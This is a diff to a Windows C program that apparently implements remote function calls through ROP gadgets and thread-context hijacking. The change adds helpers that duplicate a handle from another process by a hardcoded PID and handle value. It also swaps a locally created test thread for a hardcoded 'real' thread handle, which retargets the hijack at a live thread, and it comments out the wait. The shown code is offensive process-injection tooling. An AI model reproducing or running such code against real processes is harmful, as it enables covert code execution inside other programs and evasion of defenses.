@@ -182,9 +182,40 @@ DWORD64 CallFuncRemote(HANDLE hThread, Gadgets gadgets, DWORD64 funcAddr, BOOL r
     return (returnVal ? GetReturnValue(hThread, gadgets) : 0);
 }
 
+HANDLE GetTestThreadHandle(void) {
+    HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
+    return hThread;
+}
+
+HANDLE GetRealThreadHandle(void) {
+    HANDLE hThread = (HANDLE)0x114;
+    return hThread;
+}
+
+HANDLE OpenProcessDuplicateHandle(void) {
+    DWORD  dwTargetProcessId = 10852;
+    HANDLE hTargetHandle     = (HANDLE)0x118;
+
+    HANDLE hProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwTargetProcessId);
+    if (hProcess == NULL) return NULL;
+
+    HANDLE hDuplicated = NULL;
+    BOOL result = DuplicateHandle(
+        hProcess, 
+        hTargetHandle,
+        GetCurrentProcess(),
+        &hDuplicated,
+        0,
+        FALSE,
+        DUPLICATE_SAME_ACCESS
+    );
+
+    return hDuplicated;
+}
+
 int main(void) {
 
-    HANDLE hThread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);
+    HANDLE hThread = GetRealThreadHandle();
     if (hThread == NULL) {
         printf("[!] CreateThread failed with error code: %lu\n", GetLastError());
         return 1;
@@ -301,6 +332,6 @@ int main(void) {
     SetThreadContext(hThread, &ctx);
     ResumeThread(hThread);
 
-    WaitForSingleObject(hThread, INFINITE);
+    //WaitForSingleObject(hThread, INFINITE);
     return 0;
 }
